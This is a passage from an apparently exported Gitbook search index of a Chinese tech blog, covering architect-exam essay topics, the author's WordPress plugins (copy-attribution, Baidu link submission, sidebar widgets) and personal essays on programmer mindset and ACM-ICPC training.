数据持久层位于领域层和基础架构层之间。由于对象实例和关系实例这两大领域之间存在“阻抗不匹配”,所以把数据持久层单独作为一个层提出来的原因就是能够在对象-关系数据库之间提供一个成功的企业级映射解决方案，尽最大可能弥补这两种实例之间的差异。 本题要求分析持久层架构设计中有哪些数据访问模式，数据访问模式包括：在线访问、Data Access Object、Data Transfer Object、离线数据模式、对象/关系映射（O/R Mapping:Object/Relation Mapping）。此处需要详细描述这些模式的主要内容。 2012论决策支持系统的开发与应用 本题考查决策支持系统的开发。 决策支持系统（Decision Support System,DSS）是辅助决策者通过数据、模型和知识，以人机交互方式进行半结构化或非结构化决策的计算机应用系统。它是MIS向更高一级发展而产生的先进信息系统。它为决策者提供分析问题、建立模型、模拟决策过程和方案的环境，调用各种信息资源和分析工具，帮助决策者提高决策水平和质量。 要完成本题的写作，需要充分了解决策支持系统的概念，这种系统有何用途，以分析，为什么要建立决策分析系统。并需要了解决策支持系统的建设与一般MIS系统有何区别，这样才能找出题目中要求的“在建立决策支持系统时需要解决的一般关键问题”.些处的关键问题，可以因不同项目而异，所以说明需要解决的关键问题时，还需给出合理的分析，为什么这是个关键问题。 2012论企业信息化规划的实施与应用 本题的考查方向是企业信息化规划。 企业信息化规划是企业信息化建设的纲领和向导，是信息系统设计和实施的前提和依据，意义重大。文章中应首先描述企业战略与企业信息化规划之间的关系，并实质性的指出目前企业的战略，由此而来的信息化规划要求。 在进行信息化规划过程中，需要注意方法的应用，方法包括但不限于：企业系统规划方法（BSP）、战略数据规划方法、信息工程方法。选择其中的一种，说明，为什么采用这种方法，作者是如何采用这种方法来做规划的，步骤效果如何。 最后题目要求总结经验，分析效果，以及分析原因，这里其实是暗示大家，信息化规划不可能做到尽善尽美，总会有问题存在。所以此时不要“报喜不报忧”,这样会显得很假，需要指出一些实质性的问题，再给出解决方案，这样会显得更加的真实。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/resource/WP插件_AutoAddCopyright.html":{"url":"markdown/resource/WP插件_AutoAddCopyright.html","title":"WP插件：Auto Add Copyright","keywords":"","body":"WP插件：Auto Add Copyright – 被复制时自动追加版权链接前言优势比对插件特色插件下载WP插件：Auto Add Copyright – 被复制时自动追加版权链接 前言 这是本站出品的第一个WP插件，纪念一下。 当你在网站辛苦发布的文章，被别人不露声色随便拷贝走了，是不是很心痛呢？ 本插件可以在别人拷贝你站点内容的时候，自动在内容末尾追加你的站点版权信息。 顺带一提，虽然已经有插件（如 WP Content Copy Protection & No Right Click）可以完全禁止读者复制你站点的内容以保护你的资源，但是这对读者是很不友好的。尤其当你的站点提供了一些教程类的文章、且文章中存在命令断句时，读者如果不能复制这些命令是很痛苦的事情。 优势比对 网上已经有很多同类的JS脚本， 但是大部分都因为过时而存在不少问题，这里简单做个比较： 方法 类型 优点 缺点 window.clipboard JS脚本 直接操作剪贴板，简单易用 仅适用于IE浏览器 ZeroClipboard JS脚本 解决了window.clipboard的适用范围问题 需要Flash支持，但在HTML5技术流行的当下，Flash已淘汰 window.getSelection JS脚本 无需操作剪贴板，兼容大部分浏览器 所复制的内容会丢失换行等格式，且内容中若有代码也会丢失（尤其是html） Auto Add Copyright WP插件 解决了前面所有缺点 暂时没想到 注： 且凡是需要通过JS脚本实现的，一般都要修改主题的 function.php、head.php 或 footer.php 文件。 先不论站长是否具备编程能力，至少切换主题后都需要再次修改代码。 而本插件则完全没有这个问题。 插件特色 当读者试图复制站点内容时，会自动在复制内容末尾追加站点版权信息 可设置允许读者复制的内容长度，小于这个长度不会触发追加机制 可设置本插件的生效范围：全站、或仅文章页面 支持大部分主流浏览器 复制内容支持纯文本、代码等，不会造成复制内容格式变形 插件下载 Auto Add Copyright v1.0（20180707）下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/resource/WP插件_BaiduLinksSubmit.html":{"url":"markdown/resource/WP插件_BaiduLinksSubmit.html","title":"WP插件：Baidu Links Submit","keywords":"","body":"WP插件：Baidu Links Submit – 实时推送站点链接到百度前言下载并安装插件使用方法① 注册百度站长平台② 获取主动推送的 site 和 token③ 设置 site 和 token 到插件关于推送结果关于重复推送WP插件：Baidu Links Submit – 实时推送站点链接到百度 前言 想要站点文章被百度收录，最快的方法就是主动推送文章链接到 百度站长平台 。 目前 百度站长平台 提供了5种提交链接的方式： ○ 自动提交 □ 主动推送（API实时推送） □ 自动推送（嵌入JS脚本实时推送） □ sitemap（被动抓取） ○ 手动提交 □ 普通提交 □ 新站提交（限首次备案不超过3个月的站点） 其中，sitemap只要配置好站点地图就不用管了，百度会定时抓取。 而手动提交一般没人去做，因为每篇文章都手动就太麻烦了（但是若是新站，则建议手动去提交下，会优先被录取） 至于 主动推送 和 自动推送 的功能是一样的，但因为有些站长因为不具备开发能力，操作起来还是相对麻烦的。 而本文要介绍的 Baidu Links Submit 插件就是封装了 主动推送 的能力。 下载并安装插件 Baidu Links Submit 插件最初来源于 百度站长论坛，但是因为原版主在2015年已停更，后来百度站长平台又升级了、加之插件本身也有几个BUG，最后导致无法使用了。 鉴于我比较喜欢这个插件的风格，因此我把2015版本的BUG修正后，重新发布了这个2018修正版： Baidu Links Submit v2.0（20180704）下载 把插件内的 baidu-links-submit文件夹 解压到 /wp-content/plugins/ 目录 即可完成安装。（由于此插件需要打印日志到文件，因此Linux系统注意不要使用root用户解压，否则WordPress可能没有写日志文件的权限） 使用方法 如前文所述，该插件的功能就是向百度实时 主动推送 网站的新链接，因此需要注册 百度站长平台 配合使用。 ① 注册百度站长平台 在 百度站长平台 注册一个账号，然后在“用户中心->站点管理”添加你的网站域名。 这里需要注意，如果网站是一级域名，例如本站是 exp-blog.com ，虽然在访问的时候是等价于 www.exp-blog.com 的， 但是在WordPress中设置的站点是 exp-blog.com，那么在百度站长平台添加的站点也必须是 exp-blog.com （百度会建议你加上www，除非你的站点也有www，否则无视掉这个建议）。 换而言之，WordPress的站点必须与百度站长平台设置的站点完全一致，否则之后无法推送链接。 ② 获取主动推送的 site 和 token 注册后，在“站点管理->链接提交->自动提交->主动推送（实时）”可以得到一串类似这样的推送地址： http://data.zz.baidu.com/urls?site=exp-blog.com&token=xxxxxxxxxxxx 把其中的site和token记录下来（注意这里的site其实就是第①步设置的站点地址）。 ③ 设置 site 和 token 到插件 在WordPress插件管理页面启动此插件，进入设置，填写第②步得到的 site 和token（同时建议打开Log日志开关），保存即可，以后新建文章或页面时就会自动推送到百度了。 关于推送结果 发布文章后，可以通过插件的设置页，查看“当日限额&提交量”是否发生变化，以确认是否推送成功（百度站长平台是隔天统计的，不能马上查看到推送情况）。 若提交量无变化，则可登陆系统后台查看日志确认原因： /wp-content/plugins/baidu-links-submit/log/submits.log 若推送成功返回的报文日志是这样的（其中remain表示当天的剩余配额，success表示已成功推送的数量）： { \"remain\": 4999999, \"success\": 1 } 若推送返回的报文日志是这样的（not_same_site非空），则是提交失败： { \"remain\": 5000000, \"success\": 0, \"not_same_site\": [ \"http://www.exp-blog.com/2018/07/04/pid-1525/\" ] } 发生这种情况是因为百度认为当前站点推送了不属于该站点的链接，这是不允许的。而原因很可能就是 WordPress设置的站点名称 与 百度站长平台设置的站点名称 不一致引起的，处理方法见前文 ① 注册百度站长平台。 关于重复推送 每篇文章在推送到百度后，文章的自定义栏目会多出一个值Baidusubmit， true表示推送成功，false表示推送失败。 推送成功的文章不会再次推送链接（即使更新过内容），而推送失败的文章，在下次更新时会尝试重新推送。 若需要重新推送某篇已推送成功的文章，可以把Baidusubmit的值改成false（或直接删除之），但一般不建议这样做，因为二次提交容易导致百度翻脸，从而下调推送配额。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/resource/WP挂件_Statistics.html":{"url":"markdown/resource/WP挂件_Statistics.html","title":"WP挂件：文章/访问统计","keywords":"","body":"WP侧栏小挂件：WP Statistics改版 \"文章/访问统计\"挂件效果安装说明挂件下载使用方法：WP侧栏小挂件：WP Statistics改版 \"文章/访问统计\" 挂件效果 由于WP Statistics自带的边栏统计小工具不好看，这是本站在WP Statistics插件基础上扩展的一个WP挂件。其实就是利用WP Statistics统计接口进行重写的一个统计小工具（可再自行修改CSS样式），其效果如下： 安装说明 此工具需要预装两个插件才能使用： Enhanced Text Widget （支持在前端写PHP的小工具） WP-Statistics （统计模块，用于借用其统计函数） 挂件下载 WP-Statistics侧栏统计挂件 下载 使用方法： 1、下载后解压 2、把 statistics.css 拷贝到 Wordpress后台的主题目录下，被style.css引用（或者直接拷贝内容进去style.css也可） 3、在前端打开Wordpress的仪表盘， 外观 -> 小工具 -> Enhanced Text， 把 statistics.html 的内容拷贝进去即可 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/resource/WP挂件_CSDNaboutMe.html":{"url":"markdown/resource/WP挂件_CSDNaboutMe.html","title":"WP挂件：高仿 CSDN About ME","keywords":"","body":"WP侧栏小挂件：高仿CSDN的 \"关于我\"挂件效果挂件下载使用方法：WP侧栏小挂件：高仿CSDN的 \"关于我\" 挂件效果 此挂件是仿照CSDN的侧栏粘性挂件 \"关于我\" 做的，其效果如下： 挂件下载 WordPress侧边栏 \"关于我\" 挂件 下载 使用方法： 1、下载后解压 2、把 about-me.css 拷贝到 Wordpress后台的主题目录下，被style.css引用（或者直接拷贝内容进去也可） 3、在前端打开Wordpress的仪表盘， 外观 -> 小工具 -> 自定义HTML， 把 about-me.html 的内容拷贝进去即可 4、about-me.html 内的图片地址修改为自己的图片地址即可 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/":{"url":"markdown/feelings/","title":"心路历程","keywords":"","body":"心路历程心路历程 半杯水 一位ACMer过来人的心得 你难道没收到我的邮件？ 找BUG记 请还我安静的4小时 别让你的能力成为绊脚石 我们需要的，是测试而非重构 月缺，梦圆。 请发展你的惰性 优雅的烂代码 程序员的\"病态\" 工作需要经营 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/半杯水.html":{"url":"markdown/feelings/半杯水.html","title":"半杯水","keywords":"","body":"半杯水这应该算是引子分节目录苦逼程序猿，劳模运维狮你需要K.I.S.S掌控你的资源能力与方法囚徒困境人的核心竞争力书写是为了更好地思考半杯水 [info] 读 《暗时间》 有感 这应该算是引子 半杯水 —— 思如杯，技如水，技盈则满，思盈则空。虚而不满，似无物，可容万物。 有一个辩题为「能力和思维哪个更重要」。我不选边站，「学而不思则惘，思而不学则怠」，物极必反是亘古之理。只是现在社会的竞争过大，很多人为了眼下的生活，都过份追求自身能力的发展，而忽略了不时反思自身的那份态度。 我之前问过一个海纳百川的朋友：「你什么新技能都去试，也不想想学得多而不精有什么用？」 于是他告诉我，这样才能在短时间内让上司知道自己有什么变化，而且新东西可以显得自己与众不同。 我想说，其实如果你可以坚持每天不穿衣服去上班，也是可以起到同样效果的…… 同理，我也不认为一味思考人生就会变得很好，当然如果你想成为下一个「深井冰」，那就另当别论了。 其实辩题不应该是哪个更重要，因为都重要。关键是如何在两者之间寻求平衡，保持半杯水的「状态」 —— 但我更倾向于认为这是种互补的「心态」：不过分依赖能力、也不过分依赖思考，不过分依赖自己、也不过分依赖他人，为身边的一切寻求互补，不卑不亢，聪明地做事。 分节目录 - - ● 苦逼程序猿，劳模运维狮 —— 工作怪圈 ● 你需要K.I.S.S —— 跳出怪圈（程序猿篇） ● 掌控你的资源 —— 跳出怪圈（运维狮篇） ● 能力与方法 —— 正确地使用你的能力 ● 囚徒困境 —— 别宅了，抱团吧 ● 人的核心竞争力 —— 技能不是万能 ● 书写是为了更好地思考 —— 你的思维需要降速 苦逼程序猿，劳模运维狮 对程序猿而言，「重构」永远是最大的课题。 程序猿最困扰的，莫过于总要面对一堆乱七八糟的历史代码 —— 历史代码其本身可能并不混乱，只是经手的人多了，面目全非罢了。从心理上看，一份代码越混乱，对于维护结果抱着「无所谓」的心态越明显。但不负责任的恶性维护，尽头只能是重构，而即使重构了，却也只是新循环的开始。 而对于运维狮，「自动」应是他们最终所追求的幻想。 运维狮的工作核心基本无一例外的就是要面对大量的机器、大量的程序副本、不知何时会崩坏的线程，还要时常排查天文数字一样的监控数据，到头来却不知道自己究竟在维护什么。 即使渴望可以自动化完成这一切，但「羊群效应」却使得大多数运维狮无意识地从众，因为有安全感的，尤其所面对的东西是未知的时候 —— 既然已经有那么多非自动化部署的程序 …… 于是又手动拷贝了一份程序副本。 我们总是在嘲笑历史上的别人留下一堆麻烦，历史却总是惊人的相似 —— 因为我们在抱怨别人的烂摊子的同时，一边给别人制造烂摊子却不自知。若始终不肯抛弃「自我感觉良好」的心态，所有人都只能苦逼地活在别人制造的圈子里，然后成为别人嘲笑的劳模。这个循环是时候结束了。 你需要K.I.S.S 首先要声明的是，不要理会别人的维护质量有多烂，从自身做起，保持良好的心态，负责任地维护每一份代码才是一个程序猿应有的职业素质。 但是总有一些代码经过历史不断的修补而变得过于复杂，复杂到我们宁愿放弃80%的功能（这并不是确切的划分，只是我深受二八定律影响罢了）去重构一份简洁的代码 —— 当然如果还有保有我们所需要的那些功能就更好了。 良好的开端比什么都重要。程序猿觉得代码维护困难，根本原因在于程序设计阶段没有做好。所以无论如何，只要你一下定决心要重构，请务必由始至终把K.I.S.S原则铭记在心。K.I.S.S，即「Keep it simple,stupid!」，直译过来就是「保持简单，傻瓜」。确实，把程序复杂化无助于性能和资源的管控，也使得后续的使用和维护更加困难。 有一条程序猿悖论如是说：「程序猿的工作效率并不会随着资历的增加而有显著提高」。究其原因，年轻的程序猿会耗费大量的工作时间去敲写几万行代码以体现能力；而老程序猿更倾向于在深入思考后再写出几百行代码以体现质量，即使偶尔花了大量时间在写代码上，一般也只是为了这几百行代码找到最优的组合而已。 这是因为所有老程序猿都明白，华而不实的工作能力，只会使我们的工作变得更加困难。只有简单才是美，为了简单我们不惜付出任何代价。 掌控你的资源 相对于程序猿，运维狮没有推翻一切重来的「重构」手段，因此需要的更多是务实的精神，但务实不等同于蛮干，技巧也很重要。一个合格的运维狮应该思考的不是「能做多少」，而是「如何做得最少」。 如果你觉得维护工作开始变得困难，或者已经很困难，就需要审视自己是否有正确利用身边的资源以提高自身的工作效率和质量。不要奢望「自家的」程序猿什么时候能提供自动化的程序使你的工作变得轻松，关注第三方的运维工具并利用起来才是王道，毕竟现在的社会，什么东西都是「别人家的」更好啊。 有一条成功的箴言如是说：「要看一个人是否成功，看他晚上8点之后在干什么」。其实也是很浅显的道理，白天谋生、晚上谋事。作为运维狮，虽然少有晚上时间，但闲下来的时候必须学会充实自己。如果你还在迷茫应该学习什么，或者我能够为你指两个方向： 掌握shell/sed/awk三剑客编程：学会编写定制化的脚本 掌握自动化部署工具ansible：用程序生成程序、而不是手工复制 特别一提的是，不少运维狮容易受工作内容所限，生疏于编程语言、甚至不懂编程语言。其实不妨走出自己的圈子，学习一些编程语言，打通前后端，更有利于自身的工作。在维护出现问题的程序的时候，「知道用什么方法解决」和「知道为什么可以这样解决」是两种截然不同的境界。 这里说一个题外话，我在协助现场维护工作的时候，发现运维狮和用户之间总有争取硬件资源的矛盾。所谓「宁花机器一分，不费程序员一秒」，程序量提高了，用户却迟迟不肯放宽硬件资源，很多时候可能是没有看到有力的「证据」。如果能够做到常态化监控，并把性能数据持续集成健康的报表，对用户透明化，或许争取资源会更容易，这也是一种做事手段。 能力与方法 [info] 「如果你手里有一把锤子，所有东西看上去都像钉子」。 —— 这不是我说的。 往往我们可能花费了大量时间去学习一项技能，而学无所用是所有人最不愿意发生的事情。于是我们就会尝试在各个方面炫耀这项新技能，而不管它是否适用。 在我学习设计模式之初，就陷入了这种状态，几乎不能自拔。确实，设计模式为我打开了一扇大门，我首次知道原来代码也可以写得如此优美，使得我迫不及待地寻找可以应用它们的项目，哪怕只有一点可以用得上。但牵强附会总是没有好结果的。 再如我现在所参与的技术框架开发，虽然一些工具组件已经被成功推广起来了，但一些工具组件却依然不为人所知。不是说这些组件没有技术性，究其原因也是适用性问题。所谓的工具是为了提高开发效率才被制造出来的，而很多同事就投诉说，为了使用一个工具必须注意这注意那，还要配置一堆有的没的东西，甚至还可能与业务逻辑不兼容，如此复杂还不如自己实现。于是他们真的选择了抛弃这些工具。 所以其实正确的做事态度应该是：「如果你想钉一个钉子，所有东西看上去都像是锤子」。 即我们在处理问题时，优先考虑的是要做什么What，而不是怎么做How。只有先明确目的，才去选择合适的工具，而不是拿着一把工具对所有事情都勉而为之。正确而有效率地做事，谨记以下几点，受用无穷： 方向比努力更重要：莫要南辕北辙 流程比修补更重要：无规矩不成方圆 方法比拼命更重要：事半功倍 囚徒困境 在信息时代，「大鱼吃小鱼」已成为过去，如今是「快鱼吃慢鱼」。但如何能够「快」？在软件开发中，如果单凭一个人在闭关修炼技术，无论学习能力多么像海绵，也不可能短时间内海纳百川，又如何能快得起来？其实这也恰好说明你开始需要一个团队了 —— 为了综合实力，取长补短。 软件开发的本质就是一项团队运动，人与人的因素对结果的影响完全不亚于技术因素。一个项目成功的关键不仅仅是写出漂亮的代码，团队中的所有人朝着同一个目标一起合作也是同样重要的。但团队工作经常遇到的问题，就是沟通问题，我遇到的主要有两种情况：不愿意沟通，或无法正确表达自己想法。 举一个博弈中的著名栗子，「囚徒困境」。大概是描述这样的一个问题：两个疑犯被隔离审讯，由于证据不足，若两个都抵赖则均判1年，两个都坦白则均判8年，一个坦白一个抵赖则坦白的释放、抵赖判10年。 从整体利益上考量，最优的方案是两者均抵赖。但由于两个疑犯不知对方所想，在对方可能会抵赖的怀疑下，局限于自身利益进行判断，都会选择坦白，以保证自身利益最大化。 囚徒困境也是在团队工作中，缺乏沟通或沟通不当的必然结果。所谓的团队任务，就是要每个人承担一块工作，分别完成后再整合。如果都只从自身角度做考量而不顾他人，即使自己工作得非常出色，但最终却无法与他人的工作完成整合，那么也只是在做无用功。 只有通过不断的沟通、磨合，才可能保证整体的利益最大化，一盘散沙，终难成事。所谓「要学做事，先学做人」，时刻谨记我们都只是半杯水：内修本领、追求极致，固然重要；外联朋志、寻求互补，方是王道 —— 抱团取暖 = 力量大。 人的核心竞争力 前面讲述的都是一些现实性的东西，那些确实都是我们用来竞争的实质性资本。但毕竟随着工作的更替，很多东西也就过时了。而不过时的只有思考的方式，或者说只有思考才真正是我们作为人的不可替代的核心竞争力。 下面这些是我平时或蒐集、或所悟的「箴言」，既然是分享，我就不要脸地「借鉴」过来了。有时这些看似与技能毫无关系的东西，可能恰好就在某个转折点决定了人生，所以都参考着看一下吧： 万事先修德，养性必制怒。 广交朋友并为他们做事情。 多参与社区活动，积极分享，锻炼口才。 锻炼身体，笑到最后得有一副好身体。 反思是让人得以改进自己的最重要的思维品质。 「教」是最好的「学」。 我们都是半杯水，正是这样人生才有意义，不卑不亢，寻找互补。 人生就是一场修行，人必自助而天助之。 读书，尤其是读那些非实用性的书（如心理学等）。 潜心一到两项业余爱好，参与一些艺术活动。 不断寻找偷懒的方法，聪明地工作。 越努力，越幸运。 与智者交谈，思考，并常做笔记。 犯错趁早，防微杜渐。 因上努力，果上求缘。 书写是为了更好地思考 最后，这是一个我自身的一个小故事。 —— 一个我成为「作家（虚伪的）」之前的故事。 以前我们读书的时候，每天的工作就是写。而现在工作了，扪心自问，又还有谁拿起过笔？恐怕都差不多执笔忘字了吧。 那为什么我们需要书写？ 众所周知，物理上速度的极限是光速。但撇开物理不谈，比光速更快的，则是人的思维 —— 因为光从地球到火星都需要400秒，而人想一下就到了。 这不是脑筋急转弯，大部分人应该有过这样的经历：在思考一个问题很久却不得果时，都会试着问一下别人的想法。但当我们把问题描述一次给对方的时候，对方还没做出回答，我们就突然「想通」了。 这是因为，我们在思考问题的时候，往往已经想明白了各个细节要如何解决，但由于思维速度过快、跳跃性太大，在想细节A的时候、忘记了细节B，想B的时候又忘记了A，从而引起「想不透」或「总觉得哪里不对」的假象。 而通过文字将问题重新描述一次，实际上就是一个将思考「降速」并「梳理」的过程。因此如果一直想不透一个问题，不妨用笔将其写下来，往往问题就迎刃而解了。有时可能还会因此有意外的收获。 以上。 所以.... 所以我好像丝毫没有提到那个故事，这是因为我知道你们不会想看的。 但其实你已经猜到那个故事了 —— 所以大家都积极地写一点东西去记录自己的点点滴滴吧！ 或许一开始你可能会纠结怎样可以写出令人眼前一亮的东西，但当你意识到这可以让你更好地思考的时候，你就会摒弃这种纠结。当你慢慢习惯怎样用文字去描述你的想法时，所谓「思如泉涌」也不过如是罢了。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/一位ACMer过来人的心得.html":{"url":"markdown/feelings/一位ACMer过来人的心得.html","title":"一位ACMer过来人的心得","keywords":"","body":"一位 ACMer 过来人的心得算法学习是ACM比赛所要推广或者要提倡的一个方面用模板是不好的需要深入学习独立思考做有意义的题估算好某种训练所需要的时间有关训练的度一位 ACMer 过来人的心得 刻苦的训练我打算最后稍微提一下。主要说后者：什么是有效地训练？ 我想说下我的理解。 很多ACMer入门的时候，都被告知：要多做题，做个500多道就变牛了。其实，这既不是充分条件、也不会是必要条件。 我觉得一般情况下，对于我们普通学校的大学生，各方面能力的差距不会太大，在这种情况下，训练和学习的方法尤为重要。 其实，500题仅仅是一个标志，而且仅仅表示你做 ACM-ICPC 有一定的时间。 我们训练的目的是什么？我觉得有四点： 提高编程能力 学习算法（读书，读论文，包括做一些题目验证） 准备好面临将到来的挑战（熟悉题型，调整心态） 启发思维 这里四个目的，从训练的角度上，重要性逐次递减；为什么呢？ 因为前面的因素是后面的基础。而是后面的目的，想达成越为不易。我觉得前3者能保证你ac掉你能做的题，即使难题始终不会做，也可以ac掉中等偏难的题目。 而需要一定思维难度的题，要以前三者为基础而且属于训练的后期，中期只能作为偶尔调节。当然，我思维也烂得要死，对这点没什么发言权，大家可以鄙视我。 我这里想主要说下第2点。 对于算法，我发现，很多我们这样的弱校ACMer选手没有侧重好算法的学习。 下面要讲的几点，可能都很老套，但我想以035对比我自己的例子给大家做说明。 算法学习是ACM比赛所要推广或者要提倡的一个方面 记得曾经路过某人的blog，上面说他作比赛的时候遇到了一个dijkstra，他没做出来，然后评论到（大意）：我才不会花时间去搞明白“这种”算法。 “这种”也许有可能是指：没什么实用性，对吧，这样我就不想评论了（又是有关科学和工程的讨论）。但起码有一点需要明确的：ACM-ICPC比赛时关于计算机科学的比赛，计算机科学是算法的科学，计算机算法中dijkstra有着重要的实际和启发意义，所以比赛一定要考。 你参加这个比赛，要拿奖，就必须学习这种算法。你也许觉得你智商很高，但ACM-ICPC比赛本身不是智力比赛，比赛就是要让你去学习这些东西，所以，如果你不想学的话，我觉得也没有必要参加。说道这，可能偏题有点远，但是希望以上的分析能得出这样一个基础结论：不想学好算法，那没有必要来比赛。 用模板是不好的 现在很多我们弱校的ACM-ICPC选手比较依赖模板，说实话，我也很依赖，但是我起码知道一点，这样是不对的，某种意义上说，这是你没有把算法学明白的一种表现。而且也严重影响编码速度。在我见过的huicpc035参加过的比赛中，他从来没有看过模板，全部现场敲，有一次比赛有个图强连通分量+缩点+染色+什么的题去了，我在他们机房做，我则抄模板，结果总共敲了1个半小时，而035明确算法之后，啪啦啪啦，估计30多分钟就敲完了。这里顺便八卦一下他：我和kevin以前去湖大集训队玩的时候，给他取了个外号——打字猛男（他应该还不知道）。因为他敲键盘的声音特别大特别快，呵呵。 我觉得他敲代码的时间没有浪费，某牛曾说：因为每次敲都有可能有不同的错误，所以不用模板是好习惯。我最开始学dancing link的的时候，自己敲出了代码，然后接下来的几道题部分参考了以前的代码，后来基本上是直接copy。现在，当别人问我dancing link算法或有关的题目的时候，我已经是一脸茫然。 所以，用模板是不好的，有时候由于某些原因可能你用了模板，但你起码要知道这要做是不对的，并且有机会要改正。 需要深入学习 像 ACRush、zzy、ahyangyi...等等国家队的天才们，本身难以说我们与他们之间有什么可比性。但是他们的学习方法应该还是值得借鉴的，他们的学习方法当然我们得不到言传身教，但是从他们在国家队集训的论文中和他们搞完ACM-ICPC以后的轨迹中，可以有所体现。那就是：深入学习。 其实这点我来讲可能还是不够有力，因为我这方面也很欠缺，我尽量说下我的想法。 首先，觉得ACMer学算法不应停留在看看代码实现这个层面，在算法思想上要有清醒的认识，在正确性分析上要也应该要有较好的逻辑。因为网上的代码的实现上的一些细枝末节很可能掩盖了算法本身有的简洁性、美感和思想。因而丧失了对算法整体上的一些认识。还拿dijkstra算法打比方，有些算法不是基于 dijskstra的直接建模，而是需要你修改这个算法，这时你对算法没有真正理解的话，也就一筹莫展了。 我为什么老说Dijkstra算法，因为确实很多人都只知道用模板，而且模板还不好，在我看到的Dijkstra实现中，只有czyuan_acm的代码写得好。不是说其他的不对，但确实是有问题，投机取巧了的。 所以，要阅读论文和书籍，尤其与英文书籍，窥到它的本质。另一方面，只有这样，你学的的东西才能在ACM-ICPC以外，给你一定的启发——否则你会迅速忘掉它的。 据我所知，035起码阅读了几十篇集训队论文，orzorzorz，而且切掉了例题。 独立思考 这点我也很惭愧，因为我也是缺乏独立思考的。很多题我不会了就去搜解题报告，所以反而我的搜资料能力变得特别强。035和许多大牛在这点上做的比我好多了，他们遇到题不会的时候，也不会很急于把题目做出来，可能每隔一段时间又拿出来想一次，总有一天想通了，之后这一类型的题目基本上也就没有什么问题了。 而我恰恰比较“虚荣”，做到的题目不会不太愿意想太久，就想尽量快些AC，于是急于看解题报告，这样导致的一个问题就是有些重要的东西解题报告中没有提到，而我也没去想就把他们忽略了，这样，我还是不会做。我和035讨论问题的时候，我不会一般就直接找他要代码，但是他不懂的时候，顶多问我大体的思路，而绝对不会要代码的。 在去年ACM赛区尾声的时候，我发现035做中难题的能力已经明显超过我一个档次。看他现在做的题目，已然是相当变态，几乎是都100以下人ac，这些题目我看了基本上没什么想法，更要命的时，解题报告也搜不到。035目前的状态让我想起一个人，不知道大家知道不：wangfangbob，他切bt题的能力也是令人汗颜的。 做有意义的题 不要做水题，这里的水题定义为：一眼就能看出做法，而且中途的实现可以预计没有太多问题的题目。 做能够强化你最近学到的东西的题目 你不会但你应该会的题目 这同时也是在说，某些没太多代表性的题目可以少做，因为对比赛帮助不大。（当然我这个参加比赛的目的很功利，非功利主义者另当别论）刚才，我把我在poj上的号和他的号对比了下，他ac而我没ac的基本上是难题，我ac他没ac的一般是水题，看得我想哭，5555。 补充一点：ac的人多的并不一定代表着水题，有些几千人ac的题目，在现场赛中ac的人很少，这样的题目往往是有一定思维难度且编码不难的好题，这种题目要认真做，某个学长说：经典的题目啊，只有那么多，做一道，就少一道。 估算好某种训练所需要的时间 我觉得我学网络流就是一个例子，我在大概赛区赛之前2个月开始学习网络流，1个月前开始学习费用流，但是对于我来讲，这两个月培养出来的网络流思维还是不够（虽然也做了不少题），特别是，这种题目往往作为中难的题目出现，不会让你随便水的，于是，北京赛区的那道网络流当时就没有想出来——功利地说，学习网络流没有得到好的效果。 所以，现在来看，当时其实我可以不搞网络流。如果要学一种比较有难度的东西，并且还必须把他搞好，应该较早地，全面地学习，必须长期的训练以培养这种思维。打个比方，如果你微积分平时不学，仅仅考试前一周狂做题目，我觉得上90分是很困难的。 当然，这要根据个人情况而定，我的理解能力应该说是中等水平，如果牛的话应该可以更快地学好。 有关训练的度 我有时候通宵刷体，这里我不知道huicpc035有没有这个习惯，不过我通宵的时候没见到他通宵。 我觉得其实通宵刷体，或者太长时间地做题，还是不好的。我们为什么会这样有热情的做题呢，因为我们有兴趣；但是一个人的成功不仅仅依赖于兴趣，还要依赖于自控。这和打游戏是一个道理，游戏太有趣以至于我们常常通宵——ICPC题目也太有趣，所以有时候通宵。而且很多时候是，由于一道题AC不掉，所以赌气一定要搞定才睡觉，这样一不小心，就通宵了。 其实我明白，通宵不一定效果好，这仅仅说明了你兴趣很高涨而已。通宵往往会打乱你的时间安排，打乱你的生物钟，进而影响你短期或是中期的训练计划。而且，疲惫的状态下做题，你往往只有ac题目的欲望，而完全丧失了ac题目的灵气。所以，我建议，ACMer一定要合理安排作息，能够自控，这样不仅仅对你做 ACM-ICPC有好处。 总之，有效训练是很重要，只有通过有效的训练你才能获得你参加这个比赛应得的东西。 还有就是，除了035以外，另一个值得大家学习的就是richardxx——我也很佩服，我并不觉得他是天才，我觉得他以全方位的努力让他自己变得优秀，大家看他的blog可以看到他的学习历程。 最后要说下刻苦训练这一点，这个我主要想说给我们学校的acm队员： 客观的说，我们学校很多名校落榜生（我相比而言是水进的）。确实都蛮聪明的，但再聪明也比不上ACRush吧？人家可是SGU都切满了！ACM不是智力测试，不是你什么都不做就可以天上掉馅饼的。当然我不是说题目一定要做多少多少道，但如果你觉得你可以一心二用，从概率上来讲，你百分之九十地错了，我是个工科生，我相信概率而非奇迹。 我觉得035这方面也是值得我们学习的，我比较喜欢扯淡，有时候聊题目的时候也经常不小心就去扯其他话题去了，在学习的时候，035是坚决不多聊乱七八糟的东西的，除了讨论上QQ，平时据我观察都是残酷地训练。现在回想起来，我有点后悔，QQ上和网上花掉的时间用来学习新的东西，也许结果会更好。 ACM-ICPC绝不是大学生活的全部，也不是搞算法的全部，你大可以花时间去做其他研究，做项目，或者参加学生工作(我更欣赏那些对人生和职业有良好规划的ACMer)；但是，如果你搞ICPC的那段时间你不是全部投入，那的在ACM-ICPC生涯中，将只有后悔。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/你难道没收到我的邮件.html":{"url":"markdown/feelings/你难道没收到我的邮件.html","title":"你难道没收到我的邮件？","keywords":"","body":"你难道没收到我的邮件？你难道没收到我的邮件？ —— By EXP 2014-04-23 